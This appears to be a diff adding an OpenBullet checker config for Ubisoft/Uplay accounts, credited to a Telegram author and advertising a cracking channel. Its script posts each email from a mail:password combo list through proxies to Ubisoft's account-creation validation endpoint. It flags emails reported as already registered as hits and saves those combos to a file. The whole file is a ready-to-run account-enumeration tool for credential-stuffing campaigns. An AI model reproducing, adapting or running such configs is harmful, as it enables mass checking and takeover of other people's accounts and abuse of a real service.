@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "Uplay REQ Checker",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-03-13T12:24:48.4044284+00:00",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 1640964534
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Post REQUEST POST "https://public-ubiservices.ubi.com/v3/users/validateCreation" 
+  CONTENT "{\"password\":\"hfjrjfjd_ueu536!\",\"email\":\"<USER>\",\"country\":\"TR\",\"preferredLanguage\":\"en\",\"age\":\"28\",\"legalOptinsKey\":\"eyJ2dG91IjoiMi4wIiwidnBwIjoiNC4wIiwidnRvcyI6IjIuMSIsImx0b3UiOiJ0ci1UUiIsImxwcCI6ImVuLUlOVEwiLCJsdG9zIjoiZW4tSU5UTCJ9\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: public-ubiservices.ubi.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "Origin: https://overlay.cdn.ubisoft.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Connection: close" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Content-Length: 247" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Ubi-AppId: 2c2d31af-4ee4-4049-85dc-00dc74aef88f" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Email address already registered" 
+  KEYCHAIN Failure OR 
+    KEY "{\"validationReports\":[]}" 
+  KEYCHAIN Ban OR 
+    KEY "errorCode\":1100" 
+
+#Save UTILITY File "Uplay Reg Checker.txt" Append "<USER>:<PASS>\\n" -> VAR "Save" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
